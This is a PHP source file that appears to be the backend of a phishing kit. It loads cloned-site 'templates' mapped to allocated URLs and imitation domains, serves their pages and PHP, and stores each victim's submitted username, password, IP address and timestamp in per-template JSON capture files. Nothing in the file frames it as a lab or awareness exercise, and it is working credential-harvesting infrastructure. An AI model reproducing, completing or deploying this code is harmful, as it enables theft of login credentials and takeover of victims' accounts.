<?php
header("X-Frame-Options: DENY");
header("X-Content-Type-Options: nosniff");
header("Referrer-Policy: no-referrer");

function sanitize($data) {
    return htmlspecialchars(trim($data), ENT_QUOTES, 'UTF-8');
}

function getClientIP() {
    $ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    return sanitize($ip);
}

function saveCapture($record) {
    $captureDir = __DIR__ . '/capture';
    if (!is_dir($captureDir)) {
        mkdir($captureDir, 0755, true);
    }

    $template = $record['template'] ?? 'unknown';
    $file = $captureDir . '/' . preg_replace('/[^a-zA-Z0-9_-]/', '', $template) . '.json';
    $data = [];

    if (file_exists($file)) {
        $content = file_get_contents($file);
        $decoded = json_decode($content, true);
        if (is_array($decoded)) {
            $data = $decoded;
        }
    }

    foreach ($data as $existing) {
        if (($existing['username'] ?? '') === ($record['username'] ?? '') &&
            ($existing['password'] ?? '') === ($record['password'] ?? '') &&
            ($existing['template'] ?? '') === $template) {
            return;
        }
    }

    $newRecord = [
        'timestamp'  => date('Y-m-d H:i:s'),
        'template'   => $template,
        'ip_address' => $record['ip_address'] ?? 'unknown',
        'username'   => $record['username'] ?? '',
        'password'   => $record['password'] ?? ''
    ];

    $data[] = $newRecord;
    file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT));
}

function loadSiteRoutes() {
    static $routes = null;
    if ($routes !== null) {
        return $routes;
    }

    $routes = [];
    $templatesDir = __DIR__ . '/templates';
    
    // Search for site.json in both direct subdirectories and nested subdirectories
    $pattern1 = $templatesDir . '/*/site.json';
    $pattern2 = $templatesDir . '/*/*/site.json';
    
    foreach (array_merge(glob($pattern1) ?: [], glob($pattern2) ?: []) as $jsonFile) {
        $data = json_decode(file_get_contents($jsonFile), true);
        if (!is_array($data) || empty($data['allocated_url']) || empty($data['slug'])) {
            continue;
        }

        $routes[trim($data['allocated_url'], '/')] = [
            'slug'       => $data['slug'],
            'entry_page' => $data['entry_page'] ?? 'index.php',
            'dir'        => dirname($jsonFile),
            'name'       => $data['name'] ?? $data['slug'],
            'domain'     => $data['domain'] ?? ($data['slug'] . '.com'),
        ];
    }

    return $routes;
}

function getSiteConfig($slug) {
    $cleanSlug = preg_replace('/[^a-z0-9_-]/', '', $slug);
    
    // Try direct path first
    $file = __DIR__ . '/templates/' . $cleanSlug . '/site.json';
    if (is_file($file)) {
        $data = json_decode(file_get_contents($file), true);
        return is_array($data) ? $data : null;
    }
    
    // Try nested paths
    $nestedPattern = __DIR__ . '/templates/*/' . $cleanSlug . '/site.json';
    $matches = glob($nestedPattern);
    if (!empty($matches) && is_file($matches[0])) {
        $data = json_decode(file_get_contents($matches[0]), true);
        return is_array($data) ? $data : null;
    }
    
    return null;
}

function serveTemplateFile($templateDir, $relativePath) {
    $relativePath = str_replace(['..', '\\'], '', $relativePath);
    $relativePath = ltrim($relativePath, '/');
    $candidate = $templateDir . '/' . $relativePath;
    $file = realpath($candidate);
    $base = realpath($templateDir);

    if ($file === false || $base === false || strncmp($file, $base, strlen($base)) !== 0 || !is_file($file)) {
        http_response_code(404);
        echo 'Not Found';
        return;
    }

    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    if ($ext === 'php') {
        chdir(dirname($file));
        require $file;
        return;
    }

    $types = [
        'html' => 'text/html; charset=UTF-8',
        'css'  => 'text/css; charset=UTF-8',
        'js'   => 'application/javascript; charset=UTF-8',
        'json' => 'application/json; charset=UTF-8',
        'svg'  => 'image/svg+xml',
        'png'  => 'image/png',
        'jpg'  => 'image/jpeg',
        'jpeg' => 'image/jpeg',
        'gif'  => 'image/gif',
        'ico'  => 'image/x-icon',
        'webp' => 'image/webp',
        'woff' => 'font/woff',
        'woff2'=> 'font/woff2',
        'ttf'  => 'font/ttf',
        'map'  => 'application/json',
    ];

    header('Content-Type: ' . ($types[$ext] ?? 'application/octet-stream'));
    readfile($file);
}
